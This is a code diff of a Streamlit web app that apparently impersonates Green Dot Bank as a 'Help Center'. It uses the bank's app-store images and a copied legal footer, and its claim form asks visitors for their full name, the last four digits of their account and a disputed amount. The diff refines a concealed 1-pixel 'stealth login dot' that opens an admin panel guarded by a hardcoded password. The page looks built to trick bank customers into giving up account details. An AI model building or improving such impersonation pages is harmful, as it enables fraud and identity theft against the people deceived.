@@ -37,7 +37,6 @@ st.markdown("""<style>
         display: none !important; visibility: hidden !important;
     }
 
-    /* HIGH PRECISION BUTTON TARGETING */
     .stButton > button,
     div[data-testid="stForm"] .stButton > button {
         background-color: #00a05b !important;
@@ -49,13 +48,12 @@ st.markdown("""<style>
         height: 45px !important;
     }
 
-    /* ULTRA STEALTH LOGIN DOT */
     div.stButton > button[key="ghost_dot"] {
-        background-color: transparent !important; 
-        border: none !important; 
+        background-color: transparent !important;
+        border: none !important;
         color: transparent !important;
-        padding: 0 !important; 
-        width: 1px !important; 
+        padding: 0 !important;
+        width: 1px !important;
         height: 1px !important;
         min-height: 1px !important;
         min-width: 1px !important;
@@ -95,7 +93,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_6_0", clear_on_submit=True):
+    with st.form("claim_v32_7", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -104,13 +102,14 @@ if not st.session_state.admin_mode:
         if st.form_submit_button("SUBMIT NOW"):
             st.success("Claim Received.")
 
-    # RESTORED DOWNLOAD APP SECTION
+    # --- DOWNLOAD APP SECTION (FIXED) ---
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
             <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
             <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
         </div>
+        <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
     </div>""", unsafe_allow_html=True)
 
     st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation.</div>", unsafe_allow_html=True)
@@ -120,14 +119,13 @@ if not st.session_state.admin_mode:
         st.rerun()
 
 else:
-    # Admin logic remains stable
     st.title("Admin Access")
     pw = st.text_input("Auth Key", type="password", placeholder="Auth Key")
     c1, c2 = st.columns([3, 1])
-    with c1: 
-        if st.button("CHECK"): 
+    with c1:
+        if st.button("CHECK"):
             if pw == "Diostieneelpoder1": st.write("Logged In")
-    with c2: 
-        if st.button("↩"): 
+    with c2:
+        if st.button("↩"):
             st.session_state.admin_mode = False
             st.rerun()
